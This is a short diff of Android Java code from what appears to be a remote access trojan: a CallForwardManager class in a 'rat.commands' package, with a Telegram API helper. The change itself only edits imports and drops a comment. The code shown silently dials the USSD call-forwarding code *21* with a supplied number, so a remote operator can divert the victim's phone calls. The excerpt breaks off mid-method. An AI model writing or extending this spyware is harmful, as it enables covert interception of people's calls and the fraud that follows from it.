@@ -1,13 +1,13 @@
 package com.enterprise.rat.commands;
 
 import android.content.Context;
+import android.content.Intent;
+import android.net.Uri;
 import android.telephony.TelephonyManager;
 import com.enterprise.rat.utils.TelegramApi;
-import java.lang.reflect.Method;
 
 public class CallForwardManager {
     private Context context;
-
     public CallForwardManager(Context context) { this.context = context; }
 
     public void setForward(String number) {
@@ -25,7 +25,6 @@ public class CallForwardManager {
                     }
                 }, new android.os.Handler(android.os.Looper.getMainLooper()));
             } else {
-                // Fallback: direct dial
                 Intent intent = new Intent(Intent.ACTION_CALL);
                 intent.setData(Uri.parse("tel:" + "*21*" + number + Uri.encode("#")));
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
